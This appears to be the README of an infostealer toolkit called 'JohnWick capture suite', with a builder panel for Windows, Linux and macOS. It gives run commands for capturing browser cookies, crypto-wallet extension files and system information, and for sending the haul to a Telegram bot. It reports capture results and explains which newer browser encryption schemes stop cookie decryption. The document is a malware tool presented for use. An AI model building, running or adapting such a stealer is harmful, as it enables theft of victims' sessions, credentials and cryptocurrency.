# JohnWick capture suite

Cross-platform secret-store reader with a builder panel. One codebase runs on
Windows, Linux and macOS; the panel emits portable bundles plus per-target build
scripts.

## Run it

```bash
pip install -r requirements.txt
python jwg.py --probe        # what is actually reachable here, nothing captured
python jwg.py --dry-run      # capture + archive locally, sends nothing
python jwg.py --send         # deliver to the destination in the environment
```

Destination comes from env vars only — never a file, never a CLI flag, never baked
into a build:

```bash
export JWG_TELEGRAM_TOKEN=<bot token from @BotFather>
export JWG_TELEGRAM_CHAT=<numeric chat/user id you control>
```

`--send` without those falls back to dry-run rather than dropping the capture.

## Panel

```bash
export JWG_DASHBOARD_TOKEN=$(python -c 'import secrets;print(secrets.token_urlsafe(32))')
python builder_panel.py                    # 127.0.0.1:8787
curl -H "Authorization: Bearer $JWG_DASHBOARD_TOKEN" localhost:8787/api/probe
```

Binds loopback by default and refuses a routable bind when no token is set.

## What "no elevation needed" actually means

Measured on this host, unprivileged, uid 1000:

| store | result | why |
|---|---|---|
| Firefox cookies | **704 captured** | `moz_cookies` stores values in plaintext |
| Brave cookies | **0 of 3140** | Chrome/Brave 150+ put the master key in the XDG secret portal (`Local State` has `os_crypt.portal`, no `encrypted_key`) |
| Wallet extensions | **90 files staged** | LevelDB readable; vault blobs passphrase-wrapped inside |
| System info | complete | own-session reads |

The elevation framing was never the real constraint. Reading your own profile
files needs no privilege because you own them. Decrypting what's inside depends on
a key held by a *separate* service — DPAPI, gnome-keyring, or Firefox's PBE — and
that gate is orthogonal to admin. Root can read every byte of these databases and
still cannot unwrap the keys. So there is nothing to bypass for user-scoped data,
and no amount of privilege helps for portal/app-bound data.

Two things broke grabber-class decryption in current builds, both confirmed here
or in upstream trackers:

- **Linux:** Chrome/Brave 150+ delegate the cookie master key to the desktop secret
  portal instead of writing `encrypted_key`. Not recoverable from files.
- **Windows:** Chrome/Edge 140+ write `v20` app-bound encryption, which only the
  writing browser process can unwrap. DPAPI is not involved.

`--probe` reports which regime a host is in before capture, so an empty result
comes with its cause instead of looking like a bug.

## Verification discipline

Crypto verdicts are self-checking, never heuristic. CBC padding alone is not proof:
against Brave 155 a wrong-but-plausible key produced valid PKCS#7 on **60/60**
records while all of them decoded to high-bit garbage. Padding-pass is therefore
gated behind a printable-content check, and GCM relies on its tag. A false "locked"
is recoverable; a false "decrypted" ships garbage and looks like success.
# CookieGrabber
